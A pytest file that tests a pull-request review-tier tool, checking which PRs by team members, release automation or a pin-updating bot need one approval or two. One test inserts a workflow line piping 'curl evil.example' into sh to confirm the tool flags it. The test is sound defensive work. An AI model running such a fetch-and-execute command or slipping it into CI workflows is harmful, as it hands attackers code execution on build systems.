# Copyright 2026 Canonical Ltd.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.


"""The team, release and bot tiers, the full-review label, and approvals."""

from __future__ import annotations

import pytest
from conftest import fixture, make_pr

from charm_tech_code.review_tier._tiers import approvers, changed_lines, decide

# --- Team PRs on low-risk paths ---


@pytest.mark.parametrize(
    'files',
    [
        ['test/test_main.py', 'testing/tests/test_e2e/test_x.py', 'tracing/test/test_y.py'],
        ['docs/howto/x.md', 'README.md', 'testing/README.md', 'CONTRIBUTING.md'],
        ['examples/k8s-1-minimal/src/charm.py'],  # examples/ stays on the allow-list.
        [('test/test_new.py', 'test/test_old.py')],
    ],
)
def test_team_low_risk(config, files):
    decision = decide(make_pr(files), config)
    assert (decision.tier, decision.required) == ('Team PRs on low-risk paths', 1)
    assert 'is on a low-risk path' in decision.reason


@pytest.mark.parametrize(
    ('files', 'words'),
    [
        (['test/test_main.py', 'ops/model.py'], '`ops/model.py` is not on a low-risk path'),
        (['.github/review-tier.toml'], 'not on a low-risk path'),
        (['docs/conf.py'], 'excluded from the low-risk paths by `docs/conf.py`'),
        (['docs/requirements.txt'], 'by `*requirements*.txt`'),
        (['examples/k8s-1-minimal/uv.lock'], 'by `*uv.lock`'),
        (['examples/k8s-1-minimal/pyproject.toml'], 'by `*pyproject.toml`'),
        (['examples/k8s-1-minimal/tox.ini'], 'by `examples/*/tox.ini`'),
        # A rename out of shipped code is a change to shipped code.
        ([('test/charm.py', 'ops/charm.py')], '`ops/charm.py`'),
        ([], 'no files'),
    ],
)
def test_team_not_low_risk(config, files, words):
    decision = decide(make_pr(files), config)
    assert decision.required == 2
    assert words in decision.reason


def test_team_line_limit(config):
    assert decide(make_pr(lines=299), config).required == 1
    decision = decide(make_pr(lines=300), config)
    assert decision.required == 2
    assert '300 lines changed, and the limit is 300' in decision.reason


def test_team_login_is_case_insensitive(config):
    assert decide(make_pr(author='mattpatchava'), config).required == 1


@pytest.mark.parametrize('author', ['someone-else', 'ducky-debugger', 'copilot-swe-agent[bot]'])
def test_not_team(config, author):
    decision = decide(make_pr(author=author), config)
    assert (decision.tier, decision.required) == (None, 2)
    assert f'@{author} is not on the team list' in decision.reason


def test_full_review_is_sticky(config):
    # labels_ever holds every label added in the timeline, removed or not.
    decision = decide(make_pr(labels={'full-review'}), config)
    assert decision.required == 2
    assert 'even if the label has since been removed' in decision.reason
    assert decide(make_pr(labels={'docs'}), config).required == 1


# --- Automated release PRs ---

PYPROJECT = """[project]
name = "ops-scenario"
version = "{v}"
dependencies = [
    "ops=={ops}",
    "PyYAML>=6.0.1",
]
"""
RELEASE_FILES = ['CHANGES.md', 'ops/version.py', 'testing/pyproject.toml', 'uv.lock']


def release_pr(head_extra=None, files=RELEASE_FILES, branch='post-release-3.9.0', lock=None):
    base = {
        'CHANGES.md': '# 3.9.0\n',
        'ops/version.py': "version: str = '3.9.0'\n",
        'testing/pyproject.toml': PYPROJECT.format(v='8.9.0', ops='3.9.0'),
        'uv.lock': fixture('uv-2807-base.lock'),
    }
    head = {
        'CHANGES.md': '# 3.10.0\n\n* Things.\n# 3.9.0\n',
        'ops/version.py': "version: str = '3.10.0.dev0'\n",
        'testing/pyproject.toml': PYPROJECT.format(v='8.10.0.dev0', ops='3.10.0.dev0'),
        'uv.lock': lock or fixture('uv-2807-head.lock'),
        **(head_extra or {}),
    }
    return make_pr(files, author='github-actions[bot]', branch=branch, base=base, head=head)


def test_release(config):
    decision = decide(release_pr(), config)
    assert (decision.tier, decision.required) == ('Automated release PRs', 1)


def test_release_wrong_branch(config):
    decision = decide(release_pr(branch='sneaky'), config)
    assert decision.required == 2
    assert 'not a release branch' in decision.reason


def test_release_extra_file(config):
    decision = decide(release_pr(files=[*RELEASE_FILES, 'ops/model.py']), config)
    assert decision.required == 2
    assert '`ops/model.py` is not a release file' in decision.reason


@pytest.mark.parametrize(
    ('path', 'text', 'line'),
    [
        (
            'testing/pyproject.toml',
            PYPROJECT.format(v='8.10.0.dev0', ops='3.10.0.dev0').replace(
                'PyYAML>=6.0.1', 'PyYAML>=5'
            ),
            '"PyYAML>=6.0.1",',
        ),
        (
            'testing/pyproject.toml',
            PYPROJECT.format(v='8.10.0.dev0', ops='3.10.0.dev0').replace(
                '    "ops==', '    "requests==2.0",\n    "ops=='
            ),
            '"requests==2.0",',
        ),
        ('ops/version.py', "version: str = '3.10.0.dev0'\nimport os\n", 'import os'),
    ],
)
def test_release_other_lines(config, path, text, line):
    decision = decide(release_pr({path: text}), config)
    assert decision.required == 2
    assert f'`{path}` changes a line that is not allowed: `{line}`' in decision.reason


def test_release_hidden_dependency_in_lock(config):
    lock = fixture('uv-2807-head.lock').replace(
        '    { name = "websocket-client" },\n]',
        '    { name = "websocket-client" },\n    { name = "requests" },\n]',
        1,
    )
    decision = decide(release_pr(lock=lock), config)
    assert decision.required == 2
    assert '`uv.lock` changes more than our own versions' in decision.reason
    assert 'package[ops].dependencies: requests added' in decision.reason


def test_release_lock_removed(config):
    pr = release_pr()
    read = pr.read
    pr.read = lambda path, side: None if (path, side) == ('uv.lock', 'head') else read(path, side)
    assert '`uv.lock` was added or removed' in decide(pr, config).reason


# --- prints-charming-bot ---

PINS = """    - charm-repo: canonical/postgresql-operator
      commit: {sha}  # 2026-09-24T17:24:21Z
"""
DB = '.github/workflows/db-charm-tests.yaml'


def bot_pr(head, branch='auto-update-external-charm-pins', files=(DB,)):
    base = {DB: PINS.format(sha='9' * 40)}
    return make_pr(files, author='prints-charming-bot', branch=branch, base=base, head={DB: head})


def test_bot_pins(config):
    decision = decide(bot_pr(PINS.format(sha='4' * 40)), config)
    assert (decision.tier, decision.required) == ('prints-charming-bot updates', 1)


def test_bot_pins_other_line(config):
    head = PINS.format(sha='4' * 40) + '      run: curl evil.example | sh\n'
    decision = decide(bot_pr(head), config)
    assert decision.required == 2
    assert 'run: curl evil.example | sh' in decision.reason


def test_bot_short_sha(config):
    assert decide(bot_pr(PINS.format(sha='4' * 7)), config).required == 2


def test_bot_wrong_file_or_branch(config):
    assert decide(bot_pr('', files=(DB, 'ops/model.py')), config).required == 2
    assert decide(bot_pr('', branch='main'), config).required == 2


def test_bot_best_practices(config):
    pr = make_pr(
        ['docs/reuse/best-practices.txt'],
        author='prints-charming-bot',
        branch='auto-update-best-practice-docs',
    )
    assert decide(pr, config).required == 1


def test_changed_lines():
    assert changed_lines('a\nb\nc\n', 'a\nB\nc\nd\n') == ['b', 'B', 'd']
    assert changed_lines(None, 'x\n') == ['x']
    assert changed_lines('x\n', None) == ['x']


# --- Approvals ---


def review(login, state, kind='User'):
    return {'user': {'login': login, 'type': kind}, 'state': state}


@pytest.mark.parametrize(
    ('reviews', 'expected'),
    [
        ([review('a', 'APPROVED')], ['a']),
        ([review('a', 'APPROVED'), review('a', 'APPROVED')], ['a']),
        ([review('a', 'APPROVED'), review('a', 'COMMENTED')], ['a']),
        ([review('a', 'APPROVED'), review('a', 'CHANGES_REQUESTED')], []),
        ([review('a', 'DISMISSED')], []),
        ([review('a', 'CHANGES_REQUESTED'), review('a', 'APPROVED')], ['a']),
        ([review('a', 'APPROVED'), review('b', 'APPROVED')], ['a', 'b']),
        ([review('author', 'APPROVED')], []),
        ([review('copilot', 'APPROVED', 'Bot')], []),
        ([{'user': None, 'state': 'APPROVED'}], []),
    ],
)
def test_approvers(reviews, expected):
    assert approvers(reviews, 'author') == expected
